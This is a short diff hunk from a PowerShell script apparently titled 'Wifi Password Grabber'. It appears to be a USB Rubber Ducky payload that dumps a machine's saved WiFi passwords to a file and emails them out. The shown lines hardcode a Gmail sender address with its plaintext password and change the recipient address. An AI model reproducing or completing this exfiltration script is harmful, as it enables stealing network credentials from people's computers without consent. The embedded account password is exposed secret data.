@@ -12,7 +12,7 @@ Out-File wifipass.txt -Append -InputObject $a
 
 $FROM = "patitodegoma404@gmail.com"
 $PASS = "RubberDucky404!"
-$TO = "tomassj9@gmail.com"
+$TO = "patitodegoma404@gmail.com"
 
 $PC_NAME = "$env:computername"
 $SUBJECT = "Wifi Password Grabber - " + $PC_NAME
